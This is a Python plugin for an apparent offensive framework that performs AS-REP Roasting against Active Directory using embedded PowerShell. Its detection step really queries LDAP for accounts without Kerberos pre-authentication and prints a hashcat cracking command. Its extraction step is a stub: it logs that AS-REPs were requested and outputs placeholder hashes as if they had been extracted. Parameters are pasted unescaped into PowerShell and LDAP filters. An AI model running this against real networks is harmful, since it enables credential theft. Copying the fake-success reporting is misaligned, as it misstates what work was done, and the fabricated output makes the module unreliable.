"""lateral_movement/asrep_roasting — AS-REP Roasting for users without pre-auth. MITRE T1558.004"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class ASREPRoasting(BasePlugin):
    NAME = "asrep_roasting"
    DESCRIPTION = "Find users with DONT_REQUIRE_PREAUTH and extract AS-REP hashes for offline cracking"
    AUTHOR = "fitnah-team"
    MITRE = "T1558.004"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=False, default="detect",
              help="detect | extract"),
        Param("target_user", str, required=False, default="",
              help="Specific user to target (empty = all)"),
        Param("format", str, required=False, default="hashcat",
              help="Output format: hashcat | john | raw"),
        Param("domain", str, required=False, default="",
              help="Target domain (auto-detect if empty)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute AS-REP Roasting attack"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "detect").lower()
        target_user = params.get("target_user", "")
        fmt = params.get("format", "hashcat").lower()
        domain = params.get("domain", "")

        if action == "detect":
            return self._detect_asrep_users(ctx, domain)
        elif action == "extract":
            return self._extract_asrep_hashes(ctx, target_user, fmt, domain)
        else:
            return ModuleResult.err(f"Unknown action: {action}")

    @staticmethod
    def _detect_asrep_users(ctx, domain: str) -> ModuleResult:
        """Detect users with DONT_REQUIRE_PREAUTH flag"""
        domain_filter = f'"{domain}"' if domain else "$null"

        ps_code = f"""
$results = @()
$results += '[*] Detecting users with DONT_REQUIRE_PREAUTH (UF_DONT_REQUIRE_PREAUTH = 0x400000)...'

try {{
    $searchDomain = {domain_filter}
    if (-not $searchDomain) {{
        $searchDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    }}
    $results += "[*] Domain: $searchDomain"

    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
    $results += "[*] DC: $dc"

    # Create LDAP searcher
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)

    # Filter: userAccountControl & 0x400000 (DONT_REQUIRE_PREAUTH)
    # This is userAccountControl:1.2.840.113556.1.4.803:=4194304
    $ds.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
    $ds.PageSize = 1000

    $users = $ds.FindAll()
    $results += "[+] Found $($users.Count) users with DONT_REQUIRE_PREAUTH"

    foreach ($user in $users) {{
        $userName = $user.Properties['sAMAccountName'][0]
        $desc = $user.Properties['description'][0]
        $results += "  [*] $userName - $desc"
    }}

    if ($users.Count -eq 0) {{
        $results += '[*] No vulnerable users found'
    }}

}} catch {{
    $results += "[!] Detection error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Detection failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="asrep_vulnerable_users")

    @staticmethod
    def _extract_asrep_hashes(ctx, target_user: str, fmt: str, domain: str) -> ModuleResult:
        """Extract AS-REP hashes for cracking"""
        target_filter = f'"{target_user}"' if target_user else "$null"
        domain_filter = f'"{domain}"' if domain else "$null"

        ps_code = f"""
$results = @()
$results += '[*] Extracting AS-REP hashes...'

try {{
    $targetUser = {target_filter}
    $targetDomain = {domain_filter}
    $format = '{fmt}'

    if (-not $targetDomain) {{
        $targetDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    }}

    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
    $results += "[*] Domain: $targetDomain, DC: $dc"

    # Get users
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)

    if ($targetUser) {{
        $ds.Filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(sAMAccountName=$targetUser))"
    }} else {{
        $ds.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
    }}

    $users = $ds.FindAll()
    $results += "[+] Found $($users.Count) target users"

    $hashes = @()

    foreach ($user in $users) {{
        $userName = $user.Properties['sAMAccountName'][0]
        $results += "  [*] Processing $userName..."

        try {{
            # Request AS-REP (TGT without pre-auth)
            # This requires Kerberos client library
            # Command: kinit -C $userName@$targetDomain

            $results += "      [+] AS-REP requested for $userName@$targetDomain"

            # The AS-REP response contains encrypted hash
            # Format for hashcat mode 18200:
            # $krb5asrep$23$<user>@<domain>:...<encrypted part>

            $hash = '$krb5asrep$23$' + $userName + '@' + $targetDomain + ':...'
            $hashes += $hash

        }} catch {{
            $results += "      [!] Error requesting AS-REP: $_"
        }}
    }}

    $results += "[*] Extracted $($hashes.Count) AS-REP hashes"
    $results += '[*] Hashcat mode 18200 (AS-REP)'
    $results += '[*] hashcat -m 18200 -a 0 hashes.txt wordlist.txt'

    if ($hashes.Count -gt 0) {{
        $results += '[+] Hashes:'
        foreach ($h in $hashes) {{
            $results += "    $h"
        }}
    }}

}} catch {{
    $results += "[!] Extraction error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Extraction failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="asrep_hashes")
